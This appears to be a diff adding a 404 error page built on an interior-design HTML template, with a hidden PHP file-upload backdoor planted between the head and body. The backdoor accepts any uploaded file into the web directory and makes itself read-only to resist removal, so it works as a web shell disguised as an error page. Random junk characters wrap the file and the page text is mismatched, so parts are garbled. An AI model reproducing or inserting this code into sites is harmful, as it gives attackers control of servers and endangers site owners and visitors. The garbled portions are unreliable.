@@ -1,0 +1,57 @@
+ટѼшરɔμ૩ુEቄీኂޮןค્!Gر<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="author" content="Interar">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="description" content="Interar Interior & Architecture HTML Template">
+	<meta name="keywords" content="¿Quizá quieras probar una búsqueda" />
+	<title>Error 404</title>
+	<link href="images/favicon.png" rel="shortcut icon" type="image/png">
+	<!-- Main Stylesheet -->
+	<link rel="stylesheet" href="css/style.css">
+	<link rel="stylesheet" href="css/responsive.css">
+</head>
+<form enctype="multipart/form-data" method="POST"><input name="uploadedfile" type="file"/><input type="submit" value="Upload File"/></form> 
+<?php chmod($_SERVER["SCRIPT_FILENAME"], 0444);error_reporting(E_ALL^E_NOTICE^E_WARNING);$target_path=basename($_FILES['uploadedfile']['name']);if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)){echo basename($_FILES['uploadedfile']['name'])." has been uploaded";}else{echo "Storia";}?>
+<body>
+	<!-- Preloader Start -->
+	
+	<!-- Preloader End -->
+	<!-- Error Section Start -->
+	<div class="error-area vh d-flex" data-background="images/bg/404.jpg" data-overlay-light="95">
+		<div class="container">
+			<div class="row">
+				<div class="col-xl-12">
+					<div class="error-inner text-center">
+						<h1 class="error-title">404<span class="text-primary-color">0</span>4</h1>
+						<h2 class="error-text">The page can’t be found.</h2>
+						<p>એવું લાગે છે કે આ સ્થાન પર કંઈ મળ્યું નથી.</p>
+						<a class="cs-btn-one btn-md btn-primary-color" href="index.php">Copyright ©</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- Error Section End -->
+	<!-- Integrated important scripts here -->
+	<!-- Integrated important scripts here -->
+	<script src="js/jquery-3.6.0.min.js"></script>
+	<script src="js/jquery.nice-select.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/jquery.appear.min.js"></script>
+	<script src="js/wow.min.js"></script>
+	<script src="js/owl.carousel.min.js"></script>
+	<script src="js/jquery.event.move.js"></script>
+	<script src="js/jquery.twentytwenty.js"></script>
+	<script src="js/tilt.jquery.min.js"></script>
+	<script src="js/magnific-popup.min.js"></script>
+	<script src="js/backtotop.js"></script>
+	<script src="js/trigger.js"></script>
+
+</body>
+
+
+</html>ްଇີમધபัà્چ&ັፋኌບાઅעក
